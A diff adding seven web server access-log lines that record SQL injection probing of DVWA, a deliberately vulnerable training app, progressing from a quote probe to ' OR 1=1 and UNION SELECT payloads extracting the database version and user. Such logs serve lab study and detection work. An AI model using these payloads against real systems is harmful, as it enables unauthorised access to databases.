@@ -1,0 +1,7 @@
+192.168.31.167 - - [01/Mar/2022:08:34:57 -0800] "GET /dvwa/vulnerabilities/sqli/ HTTP/1.1" 200 4207
+192.168.31.167 - - [01/Mar/2022:08:35:01 -0800] "GET /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1" 200 4266
+192.168.31.167 - - [01/Mar/2022:08:35:05 -0800] "GET /dvwa/vulnerabilities/sqli/?id=2&Submit=Submit HTTP/1.1" 200 4267
+192.168.31.167 - - [01/Mar/2022:08:35:14 -0800] "GET /dvwa/vulnerabilities/sqli/?id=%27&Submit=Submit HTTP/1.1" 200 607
+192.168.31.167 - - [01/Mar/2022:08:37:10 -0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+OR+1%3D1+--+-&Submit=Submit HTTP/1.1" 200 4559
+192.168.31.167 - - [01/Mar/2022:08:38:16 -0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+OR+1%3D1+UNION+SELECT+null%2C+version%28%29+--+-&Submit=Submit HTTP/1.1" 200 4809
+192.168.31.167 - - [01/Mar/2022:08:40:26 -0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+OR+1%3D1+UNION+SELECT+null%2C+user%28%29+--+-&Submit=Submit HTTP/1.1" 200 4790
